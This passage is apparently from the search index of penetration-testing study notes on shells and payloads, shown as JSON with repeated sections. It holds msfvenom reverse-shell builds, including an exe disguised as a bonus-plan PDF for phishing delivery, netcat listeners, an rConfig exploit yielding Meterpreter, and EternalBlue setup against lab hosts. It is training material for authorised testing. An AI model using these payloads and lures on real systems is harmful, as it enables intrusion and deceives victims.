<DIR> .. 09/23/2021 10:26 AM 73,802 BonusCompensationPlanpdf.exe 1 File(s) 73,802 bytes 2 Dir(s) 9,997,516,800 bytes free","title":"MSFvenom"},{"location":"shells_payloads/msfvenom/#staged-vs-stageless-payloads","text":"Staged payloads create a way for us to send over more components of our attack. We can think of it like we are \"setting the stage\" for something even more useful. Take for example this payload linux/x86/shell/reverse_tcp . When run using an exploit module in Metasploit, this payload will send a small stage that will be executed on the target and then call back to the attack box to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell. Of course, if we use Metasploit to run this payload, we will need to configure options to point to the proper IPs and port so the listener will successfully catch the shell. Keep in mind that a stage also takes up space in memory which leaves less space for the payload. What happens at each stage could vary depending on the payload. Stageless payloads do not have a stage. Take for example this payload linux/zarch/meterpreter_reverse_tcp . Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if we deliver it by employing social engineering. This concept is also very well explained by Rapid 7 in this blog post on stageless Meterpreter payloads . Consider these two windows/meterpreter/reverse_tcp and windows/meterpreter_reverse_tcp . The former is a Staged payload. Notice the naming convention separating the stages. The latter is a Stageless payload since we see the shell payload and network communication in the same portion of the name.","title":"Staged vs. Stageless Payloads"},{"location":"shells_payloads/msfvenom/#build-a-stageless-payload","text":"hrmns@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST = 10 .10.14.113 LPORT = 443 -f elf > createbackup.elf [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 74 bytes Final size of elf file: 194 bytes","title":"Build a Stageless Payload"},{"location":"shells_payloads/msfvenom/#executing-a-stageless-payload","text":"Get payload onto target system: Email message with the file attached. Download link on a website. Combined with a Metasploit exploit module (this would likely require us to already be on the internal network). Via flash drive as part of an onsite penetration test. Once the file is on that system, it will also need to be executed. We would have a listener ready to catch the connection on the attack box side upon successful execution. NC Connection hrmns@htb[/htb]$ sudo nc -lvnp 443","title":"Executing a Stageless Payload"},{"location":"shells_payloads/msfvenom/#building-a-simple-stageless-payload-for-a-windows-system","text":"Use msfvenom to craft an executable (.exe) file that can be run on a Windows system to provide a shell. Windows Payload hrmns@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST = 10 .10.14.113 LPORT = 443 -f exe > BonusCompensationPlanpdf.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 324 bytes Final size of exe file: 73802 bytes","title":"Building a simple Stageless Payload for a Windows System"},{"location":"shells_payloads/msfvenom/#executing-a-simple-stageless-payload-on-a-windows-system","text":"This is another situation where we need to be creative in getting this payload delivered to a target system. Without any encoding or encryption , the payload in this form would almost certainly be detected by Windows Defender AV. If the AV was disabled all the user would need to do is double click on the file to execute and we would have a shell session. hrmns@htb[/htb]$ sudo nc -lvnp 443 Listening on 0.0.0.0 443 Connection received on 10.129.144.5 49679 Microsoft Windows [Version 10.0.18362.1256] (c) 2019 Microsoft Corporation. All rights reserved. C:\\Users\\htb-student\\Downloads>dir dir Volume in drive C has no label. Volume Serial Number is DD25-26EB Directory of C:\\Users\\htb-student\\Downloads 09/23/2021 10:26 AM <DIR> . 09/23/2021 10:26 AM <DIR> .. 09/23/2021 10:26 AM 73,802 BonusCompensationPlanpdf.exe 1 File(s) 73,802 bytes 2 Dir(s) 9,997,516,800 bytes free","title":"Executing a Simple Stageless Payload On a Windows System"},{"location":"shells_payloads/unix_linux/","text":"Common Considerations \u00b6 What distribution of Linux is the system running? What shell & programming languages exist on the system? What function is the system serving for the network environment it is on? What application is the system hosting? Are there any known vulnerabilities? Gaining a Shell through Attacking a Vulnerable App \u00b6 Start with an initial enumeration of the system using Nmap hrmns@htb[/htb]$ nmap -sC -sV 10 .129.201.101 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 09:09 EDT Nmap scan report for 10.129.201.101 Host is up (0.11s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA) | 256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA) |_ 256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34) |_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34 |_http-title: Did not follow redirect to https://10.129.201.101/ 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind |_ 100000 3,4 111/udp6 rpcbind 443/tcp open ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34) |_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34 |_http-title: Site doesn't have a title (text/html; charset=UTF-8). | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Not valid before: 2021-09-24T19:29:26 |_Not valid after: 2022-09-24T19:29:26 |_ssl-date: TLS randomness does not represent time 3306/tcp open mysql MySQL (unauthorized) Considering we can see the system is listening on ports 80 ( HTTP ), 443 ( HTTPS ), 3306 ( MySQL ), and 21 ( FTP ), it may be safe to assume that this is a web server hosting a web application. We can also see some version numbers revealed associated with the web stack ( Apache 2.4.6 and PHP 7.2.34 ) and the distribution of Linux running on the system ( CentOS ). Before deciding on a direction to research further (dive down a rabbit hole), we should also try navigating to the IP address through a web browser to discover the hosted application if possible. rConfig Management Tool Here we discover a network configuration management tool called rConfig. This application is used by network & system administrators to automate the process of configuring network appliances. This tool saves admins time but, if compromised, could be used to pivot onto critical network devices that switch & route packets across the network. A malicious attacker could own the entire network through rConfig since it will likely have admin access to all the network appliances used to configure. As pentesters, finding a vulnerability in this application would be considered a very critical discovery. Discovering a vulnerability in rConfig \u00b6 Using your search engine of choice will turn up some promising results. We can use the keywords: rConfig 3.9.6 vulnerability . We can also use Metasploit's search functionality to see if any exploit modules can get us a shell session on the target. msf6 > search rconfig Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/solr_velocity_rce 2019-10-29 excellent Yes Apache Solr Remote Code Execution via Velocity Template 1 auxiliary/gather/nuuo_cms_file_download 2018-10-11 normal No Nuuo Central Management Server Authenticated Arbitrary File Download 2 exploit/linux/http/rconfig_ajaxarchivefiles_rce 2020-03-11 good Yes Rconfig 3.x Chained Remote Code Execution 3 exploit/unix/webapp/rconfig_install_cmd_exec 2019-10-28 excellent Yes rConfig install Command Execution One detail that can be overlooked when relying on MSF to find an exploit module for a specific application is the version of MSF. There may be useful exploit modules that are not installed on our system or just aren't showing up via search. In these cases, it's good to know that Rapid 7 keeps code for exploit modules in their repos on github . We could do an even more specific search using a search engine: rConfig 3.9.6 exploit metasploit github This search can point us to the source code for an exploit module called rconfig_vendors_auth_file_upload_rce.rb . This exploit can get us a shell session on a target Linux box running rConfig 3.9.6. If this exploit did not show up in the MSF search, we can copy the code from this repo onto our local attack box and save it in the directory that our local install of MSF is referencing. hrmns@htb[/htb]$ locate exploits We want to look for the directories in the output associated with Metasploit Framework. /usr/share/metasploit-framework/modules/exploits We can copy the code into a file and save it in /usr/share/metasploit-framework/modules/exploits/linux/http similar to where they are storing the code in the GitHub repo. Once we find the exploit module and download it (we can use wget) or copy it into the proper directory from Github, we can use it to gain a shell session on the target. If we copy it into a file on our local system, make sure the file has .rb as the extension. All modules in MSF are written in Ruby. In msfconsole, we can manually load the exploit using the command: msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce Execute the Exploit msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit [*] Started reverse TCP handler on 10.10.14.111:4444 [*] Running automatic check (\"set AutoCheck false\" to disable) [+] 3.9.6 of rConfig found ! [+] The target appears to be vulnerable. Vulnerable version of rConfig found ! [+] We successfully logged in ! [*] Uploading file 'olxapybdo.php' containing the payload... [*] Triggering the payload ... [*] Sending stage (39282 bytes) to 10.129.201.101 [+] Deleted olxapybdo.php [*] Meterpreter session 1 opened (10.10.14.111:4444 -> 10.129.201.101:38860) at 2021-09-27 13:49:34 -0400 meterpreter > dir Listing: /home/rconfig/www/images/vendor ======================================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100644/rw-r--r-- 673 fil 2020-09-03 05:49:58 -0400 ajax-loader.gif 100644/rw-r--r-- 1027 fil 2020-09-03 05:49:58 -0400 cisco.jpg 100644/rw-r--r-- 1017 fil 2020-09-03 05:49:58 -0400 juniper.jpg We can see from the steps outlined in the exploitation process that this exploit: Checks for the vulnerable version of rConfig Authenticates with the rConfig web login Uploads a PHP-based payload for a reverse shell connection Deletes the payload Leaves us with a Meterpreter shell session meterpreter > shell Process 3958 created. Channel 0 created. dir ajax-loader.gif cisco.jpg juniper.jpg ls ajax-loader.gif cisco.jpg juniper.jpg We can drop into a system shell ( shell ) to gain access to the target system as if we were logged in and open a CMD.exe console. Spawning a TTY Shell with Python \u00b6 We can manually spawn a TTY shell using Python if it is present on the system. We can always check for Python's presence on Linux systems by typing the command: which python . To spawn the TTY shell session using Python, we type the following command: python -c 'import pty; pty.spawn(\"/bin/sh\")' sh-4.2$ sh-4.2$ whoami whoami apache This command uses python to import the pty module , then uses the pty.spawn function to execute the bourne shell binary (/bin/sh) . We now have a prompt ( sh-4.2$ ) and access to more system commands to move about the system as we please.","title":"NIX Shells"},{"location":"shells_payloads/unix_linux/#common-considerations","text":"What distribution of Linux is the system running? What shell & programming languages exist on the system? What function is the system serving for the network environment it is on? What application is the system hosting? Are there any known vulnerabilities?","title":"Common Considerations"},{"location":"shells_payloads/unix_linux/#gaining-a-shell-through-attacking-a-vulnerable-app","text":"Start with an initial enumeration of the system using Nmap hrmns@htb[/htb]$ nmap -sC -sV 10 .129.201.101 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 09:09 EDT Nmap scan report for 10.129.201.101 Host is up (0.11s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA) | 256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA) |_ 256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34) |_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34 |_http-title: Did not follow redirect to https://10.129.201.101/ 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind |_ 100000 3,4 111/udp6 rpcbind 443/tcp open ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34) |_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34 |_http-title: Site doesn't have a title (text/html; charset=UTF-8). | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Not valid before: 2021-09-24T19:29:26 |_Not valid after: 2022-09-24T19:29:26 |_ssl-date: TLS randomness does not represent time 3306/tcp open mysql MySQL (unauthorized) Considering we can see the system is listening on ports 80 ( HTTP ), 443 ( HTTPS ), 3306 ( MySQL ), and 21 ( FTP ), it may be safe to assume that this is a web server hosting a web application. We can also see some version numbers revealed associated with the web stack ( Apache 2.4.6 and PHP 7.2.34 ) and the distribution of Linux running on the system ( CentOS ). Before deciding on a direction to research further (dive down a rabbit hole), we should also try navigating to the IP address through a web browser to discover the hosted application if possible. rConfig Management Tool Here we discover a network configuration management tool called rConfig. This application is used by network & system administrators to automate the process of configuring network appliances. This tool saves admins time but, if compromised, could be used to pivot onto critical network devices that switch & route packets across the network. A malicious attacker could own the entire network through rConfig since it will likely have admin access to all the network appliances used to configure. As pentesters, finding a vulnerability in this application would be considered a very critical discovery.","title":"Gaining a Shell through Attacking a Vulnerable App"},{"location":"shells_payloads/unix_linux/#discovering-a-vulnerability-in-rconfig","text":"Using your search engine of choice will turn up some promising results. We can use the keywords: rConfig 3.9.6 vulnerability . We can also use Metasploit's search functionality to see if any exploit modules can get us a shell session on the target. msf6 > search rconfig Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/solr_velocity_rce 2019-10-29 excellent Yes Apache Solr Remote Code Execution via Velocity Template 1 auxiliary/gather/nuuo_cms_file_download 2018-10-11 normal No Nuuo Central Management Server Authenticated Arbitrary File Download 2 exploit/linux/http/rconfig_ajaxarchivefiles_rce 2020-03-11 good Yes Rconfig 3.x Chained Remote Code Execution 3 exploit/unix/webapp/rconfig_install_cmd_exec 2019-10-28 excellent Yes rConfig install Command Execution One detail that can be overlooked when relying on MSF to find an exploit module for a specific application is the version of MSF. There may be useful exploit modules that are not installed on our system or just aren't showing up via search. In these cases, it's good to know that Rapid 7 keeps code for exploit modules in their repos on github . We could do an even more specific search using a search engine: rConfig 3.9.6 exploit metasploit github This search can point us to the source code for an exploit module called rconfig_vendors_auth_file_upload_rce.rb . This exploit can get us a shell session on a target Linux box running rConfig 3.9.6. If this exploit did not show up in the MSF search, we can copy the code from this repo onto our local attack box and save it in the directory that our local install of MSF is referencing. hrmns@htb[/htb]$ locate exploits We want to look for the directories in the output associated with Metasploit Framework. /usr/share/metasploit-framework/modules/exploits We can copy the code into a file and save it in /usr/share/metasploit-framework/modules/exploits/linux/http similar to where they are storing the code in the GitHub repo. Once we find the exploit module and download it (we can use wget) or copy it into the proper directory from Github, we can use it to gain a shell session on the target. If we copy it into a file on our local system, make sure the file has .rb as the extension. All modules in MSF are written in Ruby. In msfconsole, we can manually load the exploit using the command: msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce Execute the Exploit msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit [*] Started reverse TCP handler on 10.10.14.111:4444 [*] Running automatic check (\"set AutoCheck false\" to disable) [+] 3.9.6 of rConfig found ! [+] The target appears to be vulnerable. Vulnerable version of rConfig found ! [+] We successfully logged in ! [*] Uploading file 'olxapybdo.php' containing the payload... [*] Triggering the payload ... [*] Sending stage (39282 bytes) to 10.129.201.101 [+] Deleted olxapybdo.php [*] Meterpreter session 1 opened (10.10.14.111:4444 -> 10.129.201.101:38860) at 2021-09-27 13:49:34 -0400 meterpreter > dir Listing: /home/rconfig/www/images/vendor ======================================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100644/rw-r--r-- 673 fil 2020-09-03 05:49:58 -0400 ajax-loader.gif 100644/rw-r--r-- 1027 fil 2020-09-03 05:49:58 -0400 cisco.jpg 100644/rw-r--r-- 1017 fil 2020-09-03 05:49:58 -0400 juniper.jpg We can see from the steps outlined in the exploitation process that this exploit: Checks for the vulnerable version of rConfig Authenticates with the rConfig web login Uploads a PHP-based payload for a reverse shell connection Deletes the payload Leaves us with a Meterpreter shell session meterpreter > shell Process 3958 created. Channel 0 created. dir ajax-loader.gif cisco.jpg juniper.jpg ls ajax-loader.gif cisco.jpg juniper.jpg We can drop into a system shell ( shell ) to gain access to the target system as if we were logged in and open a CMD.exe console.","title":"Discovering a vulnerability in rConfig"},{"location":"shells_payloads/unix_linux/#spawning-a-tty-shell-with-python","text":"We can manually spawn a TTY shell using Python if it is present on the system. We can always check for Python's presence on Linux systems by typing the command: which python . To spawn the TTY shell session using Python, we type the following command: python -c 'import pty; pty.spawn(\"/bin/sh\")' sh-4.2$ sh-4.2$ whoami whoami apache This command uses python to import the pty module , then uses the pty.spawn function to execute the bourne shell binary (/bin/sh) . We now have a prompt ( sh-4.2$ ) and access to more system commands to move about the system as we please.","title":"Spawning a TTY Shell with Python"},{"location":"shells_payloads/windows_shells/","text":"Enumerating Windows \u00b6 What are a few ways to determine if the host is likely a Windows Machine? Time To Live (TTL). A typical response from a Windows host will either be 32 or 128. A response of or around 128 is the most common response. We can utilize this value since most hosts will never be more than 20 hops away from your point of origin, so there is little chance of the TTL counter dropping into the acceptable values of another OS type. TTL values by OS We can also validate if host is Windows or not by using NMAP . For this example, we will utilize the -O option with verbose output -v to initialize an OS Identification scan against our target hrmns@htb[/htb]$ sudo nmap -v -O 192 .168.86.39 Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 17:40 EDT Initiating ARP Ping Scan at 17:40 Scanning 192.168.86.39 [1 port] Completed ARP Ping Scan at 17:40, 0.12s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 17:40 Completed Parallel DNS resolution of 1 host. at 17:40, 0.02s elapsed Initiating SYN Stealth Scan at 17:40 Scanning desktop-jba7h4t.lan (192.168.86.39) [1000 ports] Discovered open port 139/tcp on 192.168.86.39 Discovered open port 135/tcp on 192.168.86.39 Discovered open port 443/tcp on 192.168.86.39 Discovered open port 445/tcp on 192.168.86.39 Discovered open port 902/tcp on 192.168.86.39 Discovered open port 912/tcp on 192.168.86.39 Completed SYN Stealth Scan at 17:40, 1.54s elapsed (1000 total ports) Initiating OS detection (try #1) against desktop-jba7h4t.lan (192.168.86.39) Nmap scan report for desktop-jba7h4t.lan (192.168.86.39) Host is up (0.010s latency). Not shown: 994 closed tcp ports (reset) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 902/tcp open iss-realsecure 912/tcp open apex-mesh MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate) Device type: general purpose Running: Microsoft Windows 10 OS CPE: cpe:/o:microsoft:windows_10 OS details: Microsoft Windows 10 1709 - 1909 Network Distance: 1 hop We can see the point labeled OS CPE: cpe:/o:microsoft:windows_10 and OS details: Microsoft Windows 10 1709 - 1909 . Nmap made this guess based on several different metrics it derives from the TCP/IP stack. If you run into issues and the scans turn up little results, attempt again with the -A and -Pn options. More Info how this proccess works: Nmap Docs . Be careful of this detection method. Implementing a firewall or other security features can obscure the host or mess the results up. When possible, use more than one check to make a determination. Now that we know we are dealing with a Windows 10 host, we need to enumerate the services we can see to determine if we have a potential avenue of exploitation. To perform banner grabbing, we can use several different tools. Netcat, Nmap, and many others can perform the enumeration we need, but for this instance, we will look at a simple Nmap script called banner.nse . In a real pentest, you will want to be as thorough as possible, making sure you have the full lay of the land. hrmns@htb[/htb]$ sudo nmap -v 192 .168.86.39 --script banner.nse Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 18:01 EDT NSE: Loaded 1 scripts for scanning. <snip> Discovered open port 135/tcp on 192.168.86.39 Discovered open port 139/tcp on 192.168.86.39 Discovered open port 445/tcp on 192.168.86.39 Discovered open port 443/tcp on 192.168.86.39 Discovered open port 912/tcp on 192.168.86.39 Discovered open port 902/tcp on 192.168.86.39 Completed SYN Stealth Scan at 18:01, 1.46s elapsed (1000 total ports) NSE: Script scanning 192.168.86.39. Initiating NSE at 18:01 Completed NSE at 18:01, 20.11s elapsed Nmap scan report for desktop-jba7h4t.lan (192.168.86.39) Host is up (0.012s latency). Not shown: 994 closed tcp ports (reset) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 902/tcp open iss-realsecure | banner: 220 VMware Authentication Daemon Version 1.10: SSL Required, Se |_rverDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported/t 912/tcp open apex-mesh | banner: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProto |_col:SOAP, MKSDisplayProtocol:VNC , , MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate) Bats, DLLs, & MSI Files \u00b6 When it comes to creating payloads for Windows hosts, we have plenty of options to choose from. DLLs, batch files, MSI packages, and even PowerShell scripts are some of the most common methods to use. Keep your delivery mechanism for the payload in mind, as this can determine what type of payload you use. Payload Types to consider DLLs A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls. Batch Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of .bat . We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port. VBS VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code. MSI .MSI files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run msiexec to execute our file, which will provide us with further access, such as an elevated reverse shell. Powershell Powershell is both a shell environment and scripting language. It serves as Microsoft's modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process. Payload Generation \u00b6 Resource Description MSFVenom & Metasploit-Framework Source MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife. Payloads All The Things Source Here, you can find many different resources and cheat sheets for payload generation and general methodology. Mythic C2 Framework Source The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation. Nishang Soucre Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester. Darkarmour Source Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts. Payload Transfer and Execution \u00b6 Impacket : Impacket is a toolset built-in Python that provides us a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with psexec , smbclient , wmi , Kerberos, and the ability to stand up an SMB server. Payloads All The Things : is a great resource to find quick oneliners to help transfer files across hosts expediently. SMB : SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links. Remote execution via MSF : Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically. Other Protocols : When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use. Example Compromise \u00b6 Enumerate the Host To start this time, we will utilize an Nmap scan. The enumeration portion of any exploit chain is arguably the most critical piece of the puzzle. Understanding the target and what makes it tick will raise your chances of gaining a shell. hrmns@htb[/htb]$ nmap -v -A 10 .129.201.97 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 18:13 EDT NSE: Loaded 153 scripts for scanning. NSE: Script Pre-scanning. Discovered open port 135/tcp on 10.129.201.97 Discovered open port 80/tcp on 10.129.201.97 Discovered open port 445/tcp on 10.129.201.97 Discovered open port 139/tcp on 10.129.201.97 Completed Connect Scan at 18:13, 12.76s elapsed (1000 total ports) Completed Service scan at 18:13, 6.62s elapsed (4 services on 1 host) NSE: Script scanning 10.129.201.97. Nmap scan report for 10.129.201.97 Host is up (0.13s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: 10.129.201.97 - / 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: SHELLS-WINBLUE | NetBIOS computer name: SHELLS-WINBLUE\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2021-09-27T15:13:28-07:00 | smb-security-mode: | account_used: <blank> | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-09-27T22:13:30 |_ start_date: 2021-09-23T15:29:29 It is running Windows Server 2016 Standard 6.3. We have the hostname now, and we know it is not in a domain and is running several services. IIS could be a potential path, attempting to access the host over SMB utilizing a tool like Impacket or authenticating if we had credentials could do it, and from an OS perspective, there may be a route for an RCE as well. MS17-010 (EternalBlue) has been known to affect hosts ranging from Windows 2008 to Server 2016. With this in mind, it could be a solid bet that our victim is vulnerable since it falls in that window. Let's validate that using a builtin auxiliary check from Metasploit, auxiliary/scanner/smb/smb_ms17_010 . Search for and decide on an exploit path Determine an Exploit Path msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010 msf6 auxiliary(scanner/smb/smb_ms17_010) > show options Module options (auxiliary/scanner/smb/smb_ms17_010): Name Current Setting Required Description ---- --------------- -------- ----------- CHECK_ARCH true no Check for architecture on vulnerable hosts CHECK_DOPU true no Check for DOUBLEPULSAR on vulnerable hosts CHECK_PIPE false no Check for named pipe on vulnerable hosts NAMED_PIPES /usr/share/metasploit-framewor yes List of named pipes to check k/data/wordlists/named_pipes.t xt RHOSTS yes The target host(s), range CIDR identifier, or hosts f ile with syntax 'file:<path>' RPORT 445 yes The SMB service port (TCP) SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as THREADS 1 yes The number of concurrent threads (max one per host) msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97 RHOSTS => 10.129.201.97 msf6 auxiliary(scanner/smb/smb_ms17_010) > run [+] 10.129.201.97:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit) [*] 10.129.201.97:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Now, we can see from the check results that our target is likely vulnerable to EternalBlue. Let's set up the exploit and payload now, then give it a shot. Select Exploit & Payload, then Deliver Choose & Configure Our Exploit & Payload msf6 > search eternal Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 1 exploit/windows/smb/ms17_010_eternalblue_win8 2017-03-14 average No MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+ 2 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 3 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 4 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection 5 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution Configure the exploit and payload \u00b6 msf6 > use 2 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp msf6 exploit(windows/smb/ms17_010_psexec) > options Module options (exploit/windows/smb/ms17_010_psexec): Name Current Setting Required Description ---- --------------- -------- ----------- DBGTRACE false yes Show extra debug trace info LEAKATTEMPTS 99 yes How many times to try to leak transaction NAMEDPIPE no A named pipe that can be connected to (leave bl ank for auto) NAMED_PIPES /usr/share/metasploit-frame yes List of named pipes to check work/data/wordlists/named_p ipes.txt RHOSTS yes The target host(s), range CIDR identifier, or h osts file with syntax 'file:<path>' RPORT 445 yes The Target port (TCP) SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing SERVICE_DISPLAY_NAME no The service display name SERVICE_NAME no The service name SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder s hare SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 192.168.86.48 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Be sure to set payload options correctly before running the exploit. In this instance, we need to ensure that our RHOSTS, LHOST, and LPORT fields are correctly set. For this attempt, accepting the defaults for the rest is OK. Validate \u00b6 msf6 exploit(windows/smb/ms17_010_psexec) > show options Module options (exploit/windows/smb/ms17_010_psexec): Name Current Setting Required Description ---- --------------- -------- ----------- DBGTRACE false yes Show extra debug trace info LEAKATTEMPTS 99 yes 